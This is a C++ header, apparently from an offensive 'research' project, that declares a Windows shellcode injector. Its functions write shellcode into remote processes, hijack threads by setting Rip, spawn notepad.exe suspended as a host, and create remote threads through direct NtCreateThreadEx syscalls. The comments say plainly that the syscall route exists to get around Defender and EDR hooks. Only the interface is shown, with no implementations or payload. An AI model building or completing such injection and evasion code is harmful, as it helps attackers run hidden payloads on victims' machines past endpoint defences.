#pragma once

#include <windows.h>

#include <cstdint>
#include <vector>

namespace research::inject {

// Main orchestrator:
//   1. If target_process is empty → return false (caller falls back to direct execution).
//   2. Try thread-hijack into an existing thread of target_process.
//   3. Fall back to spawning notepad.exe suspended and creating a remote thread
//      via direct syscall (NtCreateThreadEx) to bypass Defender hooks on
//      CreateRemoteThread.
//   4. Return false if all fail so caller can use direct execution.
//
//  NOTE: The injected shellcode runs as whatever user owns the target process.
//        Pass an empty target_process to run as the current user (direct exec).
bool Inject(const std::vector<std::uint8_t>& shellcode, const wchar_t* target_process);

// Allocate -> write -> protect in a remote process using direct syscalls.
bool WriteShellcodeRemote(HANDLE hProcess, const std::vector<std::uint8_t>& shellcode, PVOID* out_addr);

// Thread hijack: suspend, set Rip, resume.
bool ThreadHijack(HANDLE hProcess, HANDLE hThread, PVOID remote_shellcode);

// Spawn a process suspended.
HANDLE SpawnSuspended(const wchar_t* exe_path, DWORD* out_pid, HANDLE* out_thread);

// Create a remote thread using NtCreateThreadEx direct syscall.
// Bypasses user-mode hooks on CreateRemoteThread (Defender, EDR).
HANDLE RemoteThreadSyscall(HANDLE hProcess, PVOID start_address);

} // namespace research::inject
